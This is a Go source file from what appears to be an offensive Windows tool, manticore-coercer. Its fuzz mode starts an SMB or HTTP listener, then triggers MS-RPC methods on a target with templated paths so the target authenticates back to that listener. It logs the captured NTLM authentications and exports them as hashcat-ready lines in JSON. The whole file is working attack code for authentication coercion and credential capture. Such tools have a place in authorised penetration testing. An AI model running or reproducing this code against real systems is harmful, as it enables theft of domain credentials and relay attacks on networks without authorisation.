package mode_fuzz

import (
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/windows/credentials"

	"github.com/TheManticoreProject/manticore-coercer/filter"
	"github.com/TheManticoreProject/manticore-coercer/listener"
	"github.com/TheManticoreProject/manticore-coercer/methods"
	"github.com/TheManticoreProject/manticore-coercer/modes/common"
	"github.com/TheManticoreProject/manticore-coercer/results"
)

const authWaitTimeout = 2 * time.Second

type Options struct {
	Target         string
	AuthType       string
	OnlyKnownPaths bool
	FuzzAuth       bool

	ListenerInterface string
	ListenerIP        string

	Domain   string
	Username string
	Password string
	Hashes   string

	SMBPort int
	DCEPort int

	Filter     filter.Filter
	Delay      time.Duration
	ExportJSON string
	Timeout    time.Duration
}

func Run(opts Options) []results.FuzzResult {
	listenIP, err := common.ResolveListenIP(opts.ListenerInterface, opts.ListenerIP)
	if err != nil {
		logger.Warn(fmt.Sprintf("Cannot resolve listener address: %s", err))
		return nil
	}

	smbListenPort := 445
	httpListenPort := 80

	var lis listener.Listener
	switch opts.AuthType {
	case "http":
		lis = listener.NewHTTPListener(listenIP, httpListenPort)
	default:
		smbLis, err := listener.NewSMBListener(listenIP, smbListenPort)
		if err != nil {
			logger.Warn(fmt.Sprintf("Cannot create SMB listener: %s", err))
			return nil
		}
		lis = smbLis
	}

	if err := lis.Start(); err != nil {
		logger.Warn(fmt.Sprintf("Cannot start listener: %s", err))
		return nil
	}
	defer lis.Stop()

	logger.Info(fmt.Sprintf("  Listener started on %s (type: %s)", listenIP, opts.AuthType))

	registry := methods.DefaultRegistry()
	vars := methods.TemplateVars{
		ListenerIP: listenIP,
		SMBPort:    smbListenPort,
		HTTPPort:   httpListenPort,
	}

	creds, err := credentials.NewCredentials(opts.Domain, opts.Username, opts.Password, opts.Hashes)
	if err != nil {
		logger.Warn(fmt.Sprintf("Invalid credentials: %s", err))
		return nil
	}

	connOpts := common.ConnectOpts{
		Target:  opts.Target,
		SMBPort: opts.SMBPort,
		DCEPort: opts.DCEPort,
		Timeout: opts.Timeout,
	}

	authSettings := []methods.RPCAuthSetting{methods.RPCAuthNone}
	if opts.FuzzAuth {
		authSettings = methods.AllRPCAuthSettings()
	}

	var allResults []results.FuzzResult

	for _, m := range registry.All() {
		if !opts.Filter.MatchMethod(m) {
			continue
		}

		for _, access := range m.Access {
			if !opts.Filter.MatchAccess(access) {
				continue
			}

			exploitPaths := selectPaths(m, opts, vars)

			for _, authSetting := range authSettings {
				if !opts.FuzzAuth {
					authSetting = access.DefaultAuth
				}
				if access.ForbidAuth && authSetting.AuthType != 0 {
					continue
				}

				for _, ep := range exploitPaths {
					if opts.AuthType == "http" && ep.AuthType != methods.AuthHTTP {
						continue
					}
					if opts.AuthType != "http" && ep.AuthType != methods.AuthSMB {
						continue
					}

					exploitPath := methods.RenderPath(ep.Template, vars)
					authLabel := authSetting.String()
					logger.Info(fmt.Sprintf("    [%s] %s", authLabel, m.FormatCall(exploitPath)))

					var trigger methods.TriggerResult
					var bindErr error

					if opts.FuzzAuth {
						trigger, bindErr = common.TryTriggerWithAuth(connOpts, m, access, authSetting, exploitPath, creds)
					} else {
						trigger = common.TryTrigger(connOpts, m, access, exploitPath, creds)
					}

					outcome := results.ClassifyOutcome(trigger)

					fr := results.FuzzResult{
						MethodResult: results.MethodResult{
							Target:      opts.Target,
							Transport:   access.Transport.String(),
							Pipe:        access.Pipe,
							Protocol:    m.Protocol,
							Function:    m.Function,
							Opnum:       m.Opnum,
							ExploitPath: exploitPath,
							Trigger:     trigger,
							Outcome:     outcome,
						},
						AuthSetting: authSetting,
						BindError:   bindErr,
					}

					printResult(fr)

					if outcome == results.OutcomeSuccess || outcome == results.OutcomePathResolved {
						auth := waitForAuth(lis)
						if auth != nil {
							fr.Auth = auth
							logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m Auth captured: %s\\%s (NTLMv%d) from %s",
								auth.Domain, auth.Username, auth.NTLMVersion, auth.FromAddr))
						} else {
							logger.Info("      \x1b[90m[-]\x1b[0m No auth received")
						}
					}

					allResults = append(allResults, fr)

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}

				if !opts.FuzzAuth {
					break
				}
			}
		}
	}

	drainRemaining(lis)

	if opts.ExportJSON != "" {
		exportJSON(opts.ExportJSON, opts.Target, allResults)
	}

	return allResults
}

func selectPaths(m methods.Method, opts Options, vars methods.TemplateVars) []methods.ExploitPath {
	if opts.OnlyKnownPaths {
		return m.ExploitPaths
	}
	return methods.FuzzExploitPaths()
}

func waitForAuth(lis listener.Listener) *results.AuthResult {
	select {
	case ar, ok := <-lis.Results():
		if ok {
			return &ar
		}
		return nil
	case <-time.After(authWaitTimeout):
		return nil
	}
}

func drainRemaining(lis listener.Listener) {
	for {
		select {
		case ar, ok := <-lis.Results():
			if !ok {
				return
			}
			logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m Late auth: %s\\%s (NTLMv%d) from %s",
				ar.Domain, ar.Username, ar.NTLMVersion, ar.FromAddr))
		case <-time.After(500 * time.Millisecond):
			return
		}
	}
}

func printResult(fr results.FuzzResult) {
	status := fr.Trigger
	outcome := fr.Outcome

	if fr.BindError != nil {
		logger.Info(fmt.Sprintf("      \x1b[91m[-]\x1b[0m bind error [%s]: %s", fr.AuthSetting, fr.BindError))
		return
	}

	switch outcome {
	case results.OutcomePathResolved:
		logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeSuccess:
		logger.Info(fmt.Sprintf("      \x1b[92m[+]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeAccessDenied:
		logger.Info(fmt.Sprintf("      \x1b[93m[!]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	case results.OutcomeFaulted:
		if status.Err != nil {
			logger.Debug(fmt.Sprintf("      \x1b[91m[-]\x1b[0m %s: %s", outcome, status.Err))
		} else {
			logger.Debug(fmt.Sprintf("      \x1b[91m[-]\x1b[0m %s", outcome))
		}
	case results.OutcomeNotAvailable:
		logger.Debug(fmt.Sprintf("      \x1b[90m[-]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	default:
		logger.Debug(fmt.Sprintf("      \x1b[90m[?]\x1b[0m %s %s", outcome, methods.FormatStatus(status.Status)))
	}
}

type jsonExport struct {
	Target  string           `json:"target"`
	Results []jsonFuzzResult `json:"results"`
}

type jsonFuzzResult struct {
	Protocol    string    `json:"protocol"`
	Function    string    `json:"function"`
	Opnum       uint16    `json:"opnum"`
	Transport   string    `json:"transport"`
	Pipe        string    `json:"pipe,omitempty"`
	ExploitPath string    `json:"exploit_path"`
	AuthSetting string    `json:"auth_setting"`
	Outcome     string    `json:"outcome"`
	Status      uint32    `json:"status"`
	BindError   string    `json:"bind_error,omitempty"`
	Auth        *jsonAuth `json:"auth,omitempty"`
}

type jsonAuth struct {
	FromAddr    string `json:"from_addr"`
	Domain      string `json:"domain"`
	Username    string `json:"username"`
	NTLMVersion int    `json:"ntlm_version"`
	HashcatMode int    `json:"hashcat_mode"`
	HashcatLine string `json:"hashcat_line,omitempty"`
}

func exportJSON(path, target string, allResults []results.FuzzResult) {
	export := jsonExport{Target: target}
	for _, fr := range allResults {
		jr := jsonFuzzResult{
			Protocol:    fr.Protocol,
			Function:    fr.Function,
			Opnum:       fr.Opnum,
			Transport:   fr.Transport,
			Pipe:        fr.Pipe,
			ExploitPath: fr.ExploitPath,
			AuthSetting: fr.AuthSetting.String(),
			Outcome:     fr.Outcome.String(),
			Status:      fr.Trigger.Status,
		}
		if fr.BindError != nil {
			jr.BindError = fr.BindError.Error()
		}
		if fr.Auth != nil {
			jr.Auth = &jsonAuth{
				FromAddr:    fr.Auth.FromAddr,
				Domain:      fr.Auth.Domain,
				Username:    fr.Auth.Username,
				NTLMVersion: fr.Auth.NTLMVersion,
				HashcatMode: fr.Auth.HashcatMode,
				HashcatLine: fr.Auth.HashcatLine,
			}
		}
		export.Results = append(export.Results, jr)
	}

	data, err := json.MarshalIndent(export, "", "  ")
	if err != nil {
		logger.Warn(fmt.Sprintf("JSON export failed: %s", err))
		return
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		logger.Warn(fmt.Sprintf("Cannot write JSON export: %s", err))
		return
	}
	logger.Info(fmt.Sprintf("  Results exported to %s", path))
}
